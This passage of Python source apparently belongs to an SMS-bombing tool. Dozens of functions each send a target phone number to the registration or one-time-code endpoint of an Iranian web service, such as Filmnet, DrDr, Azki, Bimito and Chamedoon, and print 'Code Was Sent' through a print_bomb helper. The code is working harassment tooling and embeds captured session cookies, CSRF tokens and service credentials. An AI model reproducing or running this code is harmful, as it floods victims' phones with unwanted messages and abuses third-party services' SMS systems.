_hjAbsoluteSessionInProgress=0; MEDIAAD_USER_ID=6648f107-1407-4c83-97a1-d39c9ec8ccad","TE": "Trailers"}
            sTripD = {"lang":"fa","country_id":"860","password":"snaptrippass","mobile_phone":"0"+phone,"country_code":"+98","email":"example@gmail.com"}
            try:
                sTripR = post(timeout=5, url='https://www.snapptrip.com/register', headers=sTripH, json=sTripD).json()
                if sTripR['status_code'] == 200:
                    print_bomb(f'{g}(Strip) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')

        def filmnet(phone):
            fnU = f"https://api-v2.filmnet.ir/access-token/users/{phone}/otp"
            fNh = {'Connection': 'keep-alive',
            'Accept': 'application/json, text/plain, */*',
            'DNT': '1',
            'X-Platform': 'Web',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
            'Origin': 'https://filmnet.ir',
            'Sec-Fetch-Site': 'same-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://filmnet.ir/',
            'Accept-Language': 'fa,en-US;q=0.9,en;q=0.8',
            'Cache-Control': 'no-cache',
            'Accept-Encoding': 'gzip, deflate'}
            try:
                Filmnet = get(timeout=5, url=fnU, headers=fNh).json()
                if Filmnet['meta']['operation_result'] == 'success':
                    print_bomb(f'{g}(Filmnet) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')

        def drdr(phone):
            dru = f"https://drdr.ir/api/registerEnrollment/sendDisposableCode"
            drh = {'Connection': 'keep-alive',
            'Accept': 'application/json',
            'Authorization': 'hiToken',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://drdr.ir',
            'Referer': 'https://drdr.ir/',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate'}
            try:
                drdr = post(timeout=5, url=dru, headers=drh, params={"phoneNumber":phone ,"userType":"PATIENT"}).json()
                if drdr['status'] == 'success':
                    print_bomb(f'{g}(DrDr) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')

        def itool(phone):
            itJ = {'mobile': phone}
            itU = 'https://app.itoll.ir/api/v1/auth/login'
            itH = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fa',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://itoll.ir',
                'referer': 'https://itoll.ir/',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2 Safari/537.36'
        }
            try:
                ok = post(timeout=5, url=itU, headers=itH, json=itJ).json()
                if ok['success'] == True:
                    print_bomb(f'{g}(Itool) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')

        def anar(phone):
            anrJ = {'user': phone, 'app_id': 99}
            anrU = 'https://api.anargift.com/api/people/auth'
            anrH = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '34',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://anargift.com',
        'referer': 'https://anargift.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
            }
            try:
                ok = post(timeout=5, url=anrU, headers=anrH, json=anrJ).json()      
                if ok['status'] == True:
                    print_bomb(f'{g}(AnarGift) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')

        def azki(phone):
            azkU = f'https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B"phoneNumber":"azki_{phone}"%7D'
            azkH = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==',
        'device': 'web',
        'deviceid': '6',
        'password': 'BimitoSecret',
        'origin': 'https://www.azki.com',
        'referer': 'https://www.azki.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        'user-token': 'LW6H4KSMStwwKXWeFey05gtdw2iW8QRtSk70phP6tBJindQ4irdzTmSqDI9TkVqE',
        'username': 'BimitoClient'
            }
            try:
                ok = post(timeout=5, url=azkU, headers=azkH).json()
                if ok["messageCode"] == 201:
                    print_bomb(f'{g}(Azki) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')

        def nobat(phone):
            noJ = {'mobile': phone}
            noU = 'https://nobat.ir/api/public/patient/login/phone'
            noH = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'access-control-request-headers': 'nobat-cookie',
        'access-control-request-method': 'POST',
        'origin': 'https://user.nobat.ir',
        'referer': 'https://user.nobat.ir/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
            }
            try:
                ok = post(timeout=5, url=noU, headers=noH, json=noJ).json()
                if ok["status"] != 'failed':
                    return True
            except: print_bomb(f'er')
        def chmdon(phone):
            chJ = {
            "mobile": '0'+phone.split('+98')[1],
            "origin": "/",
            "referrer_id": None
            }
            chU = 'https://chamedoon.com/api/v1/membership/guest/request_mobile_verification'
            chH = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        'cookie': 'activity=%7B%22referrer_id%22%3Anull%2C%22origin%22%3A%22%2F%22%7D',
        'origin': 'https://chamedoon.com',
        'referer': 'https://chamedoon.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
            }
            try:
                ok = post(timeout=5, url=chU, headers=chH, json=chJ).json()
                if ok["status"] == 'ok':
                    print_bomb(f'{g}(Chamedoon) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
            
        def bn(phone):
            bnJ = {
            "phone": '0'+phone.split('+98')[1]
        }
            bnU = 'https://mobapi.banimode.com/api/v2/auth/request'
            bnH = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Access-Control-Request-Headers': 'content-type,platform',
        'Access-Control-Request-Method': 'POST',
        'Connection': 'keep-alive',
        'Host': 'mobapi.banimode.com',
        'Origin': 'https://www.banimode.com',
        'Referer': 'https://www.banimode.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
            }
            try:
                ok = post(timeout=5, url=bnU, headers=bnH, json=bnJ).json()
                if ok["status"] == 'success':
                    print_bomb(f'{g}(BaniMode) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
            
        def lendo(phone):
            leD = {'_token': 'mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6',
        'mobile': '0'+phone.split('+98')[1],
        'password': 'ibvvb@3#9nc'}
            leU = 'https://lendo.ir/register?'
            leH = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'lendo_session=eyJpdiI6Imh2QXVnS3Q1ejFvQllhSVgzRTZORVE9PSIsInZhbHVlIjoicFE0VzJWc016a3BHXC9CRTE3S21OSXV0XC84U015VTJwdDBRVWZNUDRIUmxmS1gwSDR5NVEwQlhmaUlMdTM2XC9EQyIsIm1hYyI6ImMzMWRhYWE1ODA3MTE1ZGI5ZGIxNTAxNTg5NzBhNWYzNjZjNzk2MDNhYWNlNTU1OTc5ZTYzNjNmYWU5OGZiMWIifQ%3D%3D',
        'Host': 'lendo.ir',
        'Origin': 'https://lendo.ir',
        'Referer': 'https://lendo.ir/register',
        'Upgrade-Insecure-Requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
            try:
                lendoR = post(timeout=5, url=leU, headers=leH, data=leD).text
                if 'تایید شماره تلفن همراه' in lendoR:
                    print_bomb(f'{g}(Lendo) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def olgoo(phone):
            olD = {'contactInfo[mobile]': '0'+phone.split('+98')[1],
        'contactInfo[agreementAccepted]': '1',
        'contactInfo[teachingFieldId]': '1',
        'contactInfo[eduGradeIds][7]': '7',
        'submit_register': '1'}
            olU = 'https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox'
            olH = {'Accept': 'text/plain, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Length': '163',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'PHPSESSID=l1gv6gp0osvdqt4822vaianlm5',
        'Host': 'www.olgoobooks.ir',
        'Origin': 'https://www.olgoobooks.ir',
        'Referer': 'https://www.olgoobooks.ir/sn/userRegistration/',
        'X-Requested-With': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
            try:
                olgoo = post(timeout=5, url=olU, headers=olH, data=olD).text
                if 'مدت زمان باقی‌مانده تا دریافت مجدد کد' in olgoo:
                    print_bomb(f'{g}(NashrOlgoo) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
            
        def pakhsh(phone):
            paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'
            paU = 'https://www.pakhsh.shop/wp-admin/admin-ajax.php'
            paH = {'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '143',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': 'digits_countrycode=98; _wpfuuid=b21e7550-db54-469f-846d-6993cfc4815d',
        'origin': 'https://www.pakhsh.shop',
        'referer': 'https://www.pakhsh.shop/%D9%85%D8%B1%D8%A7%D8%AD%D9%84-%D8%AB%D8%A8%D8%AA-%D8%B3%D9%81%D8%A7%D8%B1%D8%B4-%D9%88-%D8%AE%D8%B1%DB%8C%D8%AF/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest'}
            try:
                ok = post(timeout=5, url=paU, headers=paH, data=paD).json()
                if ok['code'] == '1':
                    print_bomb(f'{g}(PakhshShop) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def didnegar(phone):
            paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo={phone}&csrf=4c9ac22ff4&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone}&dig_otp=&digits_login_remember_me=1&dig_nounce=4c9ac22ff4'
            paU = 'https://www.didnegar.com/wp-admin/admin-ajax.php'
            paH = {'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '143',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': 'PHPSESSID=881f0d244b83c1db49d4c39e5fe7b108; digits_countrycode=98; _5f9d3331dba5a62b1268c532=true',
        'origin': 'https://www.didnegar.com',
        'referer': 'https://www.didnegar.com/my-account/?login=true&back=home&page=1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest'}
            try:
                ok = post(timeout=5, url=paU, headers=paH, data=paD).json()
                if ok['code'] == '1':
                    print_bomb(f'{g}(DideNegar) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def baskol(phone):
            baJ = {
            "phone": '0'+phone.split('+98')[1]
        }
            baU = 'https://www.buskool.com/send_verification_code'
            baH = {'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;charset=UTF-8',
        'cookie': 'laravel_session=2Gp6A82VC8CPMgaB7sI0glrGP52XyjXNKnNAeZq3',
        'origin': 'https://www.buskool.com',
        'referer': 'https://www.buskool.com/register',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
        'x-csrf-token': 'trUVHIRWtjE58Fn9Pud1ciz2XaTbTgFHgCLsPykD',
        'x-requested-with': 'XMLHttpRequest'}
            try:
                ok = post(timeout=5, url=baU, headers=baH, json=baJ).json()
                if ok['status'] == True:
                    print_bomb(f'{g}(Baskol) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def kilid(phone):
            kiJ = {
            "mobile": '0'+phone.split('+98')[1]
        }
            kiU = 'https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL'
            kiH = {'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'COUNTRY_ID': '2',
        'Host': 'server.kilid.com',
        'LOCALE': 'FA',
        'Origin': 'https://kilid.com',
        'Referer': 'https://kilid.com/',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
            try:
                ok = post(timeout=5, url=kiU, headers=kiH, json=kiJ).json()
                if ok['status'] == 'SUCCESS':
                    print_bomb(f'{g}(Kilid) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def basalam(phone):
            baJ = {
            "variables": {
                "mobile": '0'+phone.split('+98')[1]
            },
            "query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"
        }
            baU = 'https://api.basalam.com/user'
            baH = {'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Bearer undefined',
        'content-length': '168',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://basalam.com',
        'referer': 'https://basalam.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23',
        'x-client-info': '{"name":"web.public"}',
        'x-creation-tags': '{"app":"web","client":"customer","os":"linux","device":"desktop","uri":"/accounts","fullPath":"/accounts","utms":"organic","landing_url":"basalam.com%2Faccounts","tag":[null]}'}
            try:
                ok = post(timeout=5, url=baU, headers=baH, json=baJ)
                if ok.status_code == 200:
                    print_bomb(f'{g}(BaSalam) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def see5(phone):
            seD = {'mobile': '0'+phone.split('+98')[1],
        'action': 'sendsms'}
            seU = 'https://crm.see5.net/api_ajax/sendotp.php'
            seH = {'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '33',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cookie': '_ga=GA1.2.1824452401.1639326535; _gid=GA1.2.438992536.1639326535; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; crisp-client%2Fsession%2Fc55c0d24-98fe-419a-862f-0b31e955fd59=session_812ec81d-13c1-4a69-a494-ad54e1f290ef; __utma=55084201.1824452401.1639326535.1639326540.1639326540.1; __utmc=55084201; __utmz=55084201.1639326540.1.1.utmcsr=Ads|utmgclid=EAIaIQobChMIsfOridfe9AIV5o5oCR2zJQjCEAMYAiAAEgLT8fD_BwE|utmccn=Exact-shopsaz|utmcmd=cpc|utmctr=(not%20provided); _gac_UA-62787234-1=1.1639326540.EAIaIQobChMIsfOridfe9AIV5o5oCR2zJQjCEAMYAiAAEgLT8fD_BwE; __utmt=1; __utmb=55084201.3.10.1639326540; WHMCSkYBsAa1NDZ2k=6ba6de855ce426e25ea6bf402d1dc09c',
        'origin': 'https://crm.see5.net',
        'referer': 'https://crm.see5.net/clientarea.php',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23',
        'x-requested-with': 'XMLHttpRequest'}
            ok = post(timeout=5, url=seU, headers=seH, data=seD).text
            try:
                if ok == 'send_sms':
                    print_bomb(f'{g}(See5) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def ghabzino(phone):
            ghJ = {
            "Parameters": {
                "ApplicationType": "Web",
                "ApplicationUniqueToken": None,
                "ApplicationVersion": "1.0.0",
                "MobileNumber": '0'+phone.split('+98')[1]
            }
        }
            ghU = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode'
            ghH = {'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://ghabzino.com',
        'referer': 'https://ghabzino.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
            try:
                ok = get(timeout=5, url=ghU, headers=ghH, json=ghJ).json()
                if ok["Parameters"] != None:
                    print_bomb(f'{g}(Ghabzino) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def simkhanF(phone):
            ghJ = {
            "mobileNumber": '0'+phone.split('+98')[1],
            "ReSendSMS": False
        }
            ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
            ghH = {'Accept': 'application/json',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Authorization': 'Bearer undefined',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Host': 'www.simkhanapi.ir',
        'Origin': 'https://simkhan.ir',
        'Referer': 'https://simkhan.ir/',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
            try:
                ok = post(timeout=5, url=ghU, headers=ghH, json=ghJ).json()
                if ok['Message'] == "ثبت نام شما با موفقیت انجام شد":
                    print_bomb(f'{g}(SimKhan) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def simkhanT(phone):
            ghJ = {
            "mobileNumber": '0'+phone.split('+98')[1],
            "ReSendSMS": True
        }
            ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
            ghH = {'Accept': 'application/json',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Authorization': 'Bearer undefined',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Host': 'www.simkhanapi.ir',
        'Origin': 'https://simkhan.ir',
        'Referer': 'https://simkhan.ir/',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
            try:
                ok = post(timeout=5, url=ghU, headers=ghH, json=ghJ).json()
                if ok['Message'] == "ثبت نام شما با موفقیت انجام شد":
                    print_bomb(f'{g}(SimKhan) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def drsaina(phone):
            ghD = f"__RequestVerificationToken=CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJN4BxSjZ24pukCJF2AQiWg&noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber={'0'+phone.split('+98')[1]}&confirmCode=&fullName=&Password=&Password2="
            ghU = 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation'
            ghH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': '.AspNetCore.Antiforgery.ej9TcqgZHeY=CfDJ8NPBKm5eTodHlBQhmwjQAVWqg8-UO73YXzMYVhYk28IlZQexrnyEhYldxs2Ylnp3EZE2o3tccNQ0E7vRSUGVMNDfmcFOKPcUCG7sysT7unE5wui_vwzMvyCNDqIRZ1Wxd2AKD3s3lu-2BvFOXc_j7ts; anonymousId=-fmvaw07O1miRXbHtKTVT; segmentino-user={"id":"-fmvaw07O1miRXbHtKTVT","userType":"anonymous"}; _613757e830b8233caf20b7d3=true; _ga=GA1.2.1051525883.1639482327; _gid=GA1.2.2109855712.1639482327; __asc=bf42042917db8c3006a2b4dcf49; __auc=bf42042917db8c3006a2b4dcf49; analytics_token=a93f2bb1-30d0-4e99-18cc-b84fcda27ae9; yektanet_session_last_activity=12/14/2021; _yngt_iframe=1; _gat_UA-126198313-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_session_token=efcee442-344d-1374-71b8-60ca960029c9; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _gac_UA-126198313-1=1.1639482345.EAIaIQobChMImrmRrJvj9AIV2ZTVCh07_gUpEAAYASAAEgILoPD_BwE; cache_events=true',
        'origin': 'https://www.drsaina.com',
        'referer': 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
            try:
                ok = post(timeout=5, url=ghU, headers=ghH, data=ghD).text
                if 'کد تایید 6 رقمی پیامک شده به شماره' in ok:
                    print_bomb(f'{g}(DrSaina) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def binjo(phone):
            ghU = f"https://api.binjo.ir/api/panel/get_code/{'0'+phone.split('+98')[1]}"
            ghH = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache, private',
        'Content-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'Cookie': 'laravel_session=eyJpdiI6InY0T2JYTndZb0xacURzcXFtWWxORHc9PSIsInZhbHVlIjoiUmo1bVd0UklmdjJyc1wvZGNHVDRuRU96RVZVZFhpb1N4ZmJ3NkduUGJYMGhyRG42QVNwVUNHVlZZRUNqV0hjUysiLCJtYWMiOiIzNTBlOWIzOTkxMDYyM2EzNzViYWFhYjdkM2FlNjQ1YmZjOTU3NzNiMjRlYjNlMmZiZmQzOGRkZTI0Yzc0NTU1In0%3D',
        'Host': 'api.binjo.ir',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
            try:
                ok = get(timeout=5, url=ghU, headers=ghH, verify=False).json()
                if ok['status'] == 'ok':
                    print_bomb(f'{g}(BinJo) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def limome(phone):
            liD = {'mobileNumber': phone.split('+98')[1],
        'country': '1'}
            liU = 'https://my.limoome.com/api/auth/login/otp'
            liH = {'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'sess=00da3860-929a-4429-aef9-82bb64f9a439; basalam-modal=1',
        'Host': 'my.limoome.com',
        'Origin': 'https://my.limoome.com',
        'Referer': 'https://my.limoome.com/login?redirectlogin=%252Fdiet%252Fpayment',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33',
        'X-Requested-With': 'XMLHttpRequest'}
            try:
                liR = post(timeout=5, url=liU, headers=liH, data=liD).json()
                if liR['status'] == 'success':
                    print_bomb(f'{g}(Limome) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def bimito(phone):
            liU = f"https://bimito.com/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%220{phone.split('+98')[1]}%22%7D"
            liH = {'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': '_gcl_aw=GCL.1639580987.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _gcl_au=1.1.1134321035.1639580987; _ga=GA1.2.74824389.1639580987; _gid=GA1.2.40868592.1639580992; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_token=9fbae680-00a7-8cbf-6be6-90980eae790f; yektanet_session_last_activity=12/15/2021; _yngt_iframe=1; _gac_UA-89339097-1=1.1639580999.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _clck=dlyt9o|1|exa|0; crisp-client%2Fsession%2Fbde9082c-438a-4943-b9b5-362fed0a182a=session_2fdd45a5-8c9d-4638-b21a-40a2ebd422db; _clsk=ktdj0|1639581807259|2|1|d.clarity.ms/collect; _ga_5LWTRKET98=GS1.1.1639580986.1.1.1639581904.60',
        'device': 'web',
        'deviceid': '3',
        'origin': 'https://bimito.com',
        'referer': 'https://bimito.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33',
        'user-token': 'swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp'}
            try:
                liR = post(timeout=5, url=liU, headers=liH).json()
                if liR['message'] == 'کاربر قبلا ثبت نام نکرده است':
                    print_bomb(f'{g}(BimitoVip) {w}Code Was Sent')
                    return True
            except: print_bomb(f'er')
        def bimitoVip(phone):
            liU = f"https://bimito.com/api/core/app/user/loginWithVerifyCode/%7B%22phoneNumber%22:%220{phone.split('+98')[1]}%22%7D"
            liH = {'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': '_gcl_aw=GCL.1639580987.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _gcl_au=1.1.1134321035.1639580987; _ga=GA1.2.74824389.1639580987; _gid=GA1.2.40868592.1639580992; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_token=9fbae680-00a7-8cbf-6be6-90980eae790f; yektanet_session_last_activity=12/15/2021; _yngt_iframe=1; _gac_UA-89339097-1=1.1639580999.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _clck=dlyt9o|1|exa|0; crisp-client%2Fsession%2Fbde9082c-438a-4943-b9b5-362fed0a182a=session_2fdd45a5-8c9d-4638-b21a-40a2ebd422db; _clsk=ktdj0|1639581807259|2|1|d.clarity.ms/collect; _ga_5LWTRKET98=GS1.1.1639580986.1.1.1639581904.60',
        'device': 'web',
        'deviceid': '3',
        'origin': 'https://bimito.com',
        'referer': 'https://bimito.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33',
        'user-token': 'swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp'}
            try:
                liR = post(timeout=5, url=liU, headers=liH).json()
                if liR['message'] == 'کاربر قبلا ثبت نام نشده است':
